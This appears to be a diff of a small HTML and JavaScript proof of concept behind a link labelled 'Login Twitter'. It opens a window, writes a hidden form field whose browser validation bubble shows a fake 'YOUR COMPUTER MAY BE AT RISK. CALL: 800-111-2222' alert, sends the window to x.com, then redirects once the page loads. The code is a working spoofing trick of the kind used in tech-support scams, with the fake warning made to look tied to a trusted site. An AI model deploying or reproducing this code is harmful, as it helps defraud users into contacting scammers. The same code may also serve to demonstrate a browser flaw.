@@ -1,11 +1,17 @@
 <script>
-    function next() {
-           w.location.replace('https://www.google.com:1234');
-          }
-  
-    function f() {
-      w = window.open("");
-      w.document.write(`
+let w;
+let i;
+
+function next() {
+    w.location.replace('https://www.google.com:1234');
+}
+
+function f() {
+
+    w = window.open("");
+
+    w.document.open();
+    w.document.write(`
 <h2></h2>
 
 <input id="aaa" required>
@@ -15,13 +21,24 @@ var aaa = document.getElementById("aaa");
 aaa.style.opacity = '0';
 
 aaa.oninvalid = function (e) {
-    e.target.setCustomValidity("WARNING!\\nYOUR COMPUTER MAY BE AT RISK.\\nCALL: 800-111-2222");
+    e.target.setCustomValidity("WARNING!\\\\nYOUR COMPUTER MAY BE AT RISK.\\\\nCALL: 800-111-2222");
 };
 <\/script>
 `);
-      w.location = "https://x.com";
-      i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); next(); }", 0,5); 
-    }
-  </script>
-  
-  <a href="#" onclick="f()">Login Twitter</a>
+    w.document.close();
+
+    // navigasi
+    w.location.href = "https://x.com";
+
+    i = setInterval(function(){
+        try {
+            let x = w.location.href;
+        } catch(e) {
+            clearInterval(i);
+            next();
+        }
+    }, 50);
+}
+</script>
+
+<a href="#" onclick="f()">Login Twitter</a>
